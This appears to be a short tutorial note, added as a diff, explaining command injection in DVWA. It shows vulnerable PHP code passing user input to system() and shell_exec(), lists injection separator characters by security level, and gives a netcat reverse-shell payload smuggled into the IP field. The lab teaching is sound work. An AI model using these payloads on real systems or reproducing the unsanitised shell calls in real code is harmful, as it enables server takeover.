@@ -1,0 +1,49 @@
+Command Injection is a web vulnerability that allows an attacker to execute arbitrary system commands on the server running a vulnerable web application.
+
+This occurs when user input is unsafely passed to a system shell/OS command without proper validation or sanitization.
+
+
+When a web application uses OS commands like:
+system("ping " . $_GET['ip']);
+
+
+
+🧱 How It Happens: Technical Breakdown
+A command injection vulnerability usually happens when:
+
+The backend uses system(), exec(), shell_exec(), or similar
+
+The input is directly added to the OS command
+
+The input is not validated properly
+
+
+
+⚠️ Why It's Dangerous
+Command Injection is severe because it allows:
+
+Reading sensitive files (e.g., /etc/passwd)
+
+Creating reverse shells to gain remote access
+
+Downloading and running malware
+
+Escalating privileges (root access)
+
+
+🧪 Examples of Payloads
+Payload	Description
+Low =  '||', '&', ';', '|', '-', '$', '(', ')', '`', '&&'
+
+Med = '||', '&', '|', '-', '$', '(', ')', '`',
+For Reverse shell at Low and Med security = 127.0.0.1|nc 192.168.33.133 8181 -e /bin/bash
+
+High =  '| '  
+
+
+In DVWA:
+
+The code might look like:
+
+$target = $_REQUEST['ip'];
+$cmd = shell_exec("ping -c 4 $target");
